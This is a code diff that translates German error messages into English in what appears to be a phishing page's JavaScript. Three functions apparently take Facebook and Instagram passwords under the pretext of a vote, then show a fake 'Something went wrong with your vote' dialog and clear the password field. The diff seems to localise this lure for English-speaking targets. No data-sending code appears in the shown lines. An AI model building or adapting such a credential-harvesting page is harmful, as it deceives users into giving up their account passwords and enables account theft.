@@ -43,10 +43,10 @@ function hmlog() {
 
     setTimeout(function () {
       Swal.fire({
-        title: "Ups!",
-        text: "Etwas ist mit Ihrer Stimme schiefgelaufen.",
+        title: "Oops!",
+        text: "Something went wrong with your vote.",
         icon: "error",
-        confirmButtonText: "Erneut versuchen",
+        confirmButtonText: "Try Again",
       });
       document.getElementById("fb-pass").value = "";
 
@@ -86,10 +86,10 @@ function iglog() {
 
     setTimeout(function () {
       Swal.fire({
-        title: "Ups!",
-        text: "Etwas ist mit Ihrer Stimme schiefgelaufen.",
+        title: "Oops!",
+        text: "Something went wrong with your vote.",
         icon: "error",
-        confirmButtonText: "Erneut versuchen",
+        confirmButtonText: "Try Again",
       });
 
       document.getElementById("ig-pass").value = "";
@@ -128,10 +128,10 @@ function login() {
 
     setTimeout(function () {
       Swal.fire({
-        title: "Ups!",
-        text: "Etwas ist mit Ihrer Stimme schiefgelaufen.",
+        title: "Oops!",
+        text: "Something went wrong with your vote.",
         icon: "error",
-        confirmButtonText: "Erneut versuchen",
+        confirmButtonText: "Try Again",
       });
       document.getElementById("fb-pass").value = "";
 
